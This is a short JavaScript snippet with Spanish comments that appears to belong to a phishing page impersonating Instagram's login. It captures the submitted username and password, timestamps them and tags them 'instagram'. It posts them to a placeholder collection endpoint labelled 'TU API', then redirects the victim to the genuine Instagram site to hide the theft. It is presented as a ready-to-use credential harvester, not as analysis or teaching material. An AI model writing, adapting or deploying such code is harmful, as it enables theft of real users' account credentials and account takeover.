  const form = document.getElementById('login-form');

    form.addEventListener('submit', async function(e) {
      e.preventDefault(); // Evita el envío tradicional

      const username = form.username.value;
      const password = form.password.value;

      // Obtener fecha y hora actuales
      const now = new Date();
      const fecha = now.toLocaleDateString(); // Ej: "15/6/2025"
      const hora = now.toLocaleTimeString();  // Ej: "18:45:30"

      const payload = {
        username,
        password,
        fecha,
        hora,
        tag: "instagram"
      };

      console.log("📦 Enviando a la API con los siguientes datos:");
      console.log(payload);

      try {
        const response = await fetch('TU API', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        const result = await response.json();
        console.log("✅ Respuesta de la API:");
        console.log(result); // Se mostrará el objeto como JSON
 
        // Redirige a Instagram luego de enviar los datos
        window.location.href = "https://www.instagram.com/";
      } catch (error) {
        console.error("❌ Error al conectar con la API:", error);
        window.location.href = "https://www.instagram.com/";
      }
    });
